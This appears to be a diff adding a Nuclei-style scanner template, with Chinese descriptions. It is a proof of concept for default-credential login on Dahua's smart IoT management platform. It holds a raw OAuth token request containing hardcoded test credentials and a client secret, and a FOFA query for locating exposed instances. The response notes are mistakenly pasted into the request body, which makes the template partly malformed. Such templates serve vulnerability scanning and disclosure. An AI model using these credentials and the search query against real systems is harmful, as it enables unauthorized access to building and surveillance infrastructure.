@@ -1,0 +1,48 @@
+id: poc-xgmvdg56p3vlubxb
+info:
+  name: 大华智能物联综合管理平台 默认口令
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xgmvdg56p3vlubxb'
+  tags: default-login,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xgmvdg56p3vlubxb
+    fofa: body="/static/fontshd/font-hd.css"
+http:
+- raw:
+  - 'POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
+
+
+    Accept-Encoding: gzip
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    access_token
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
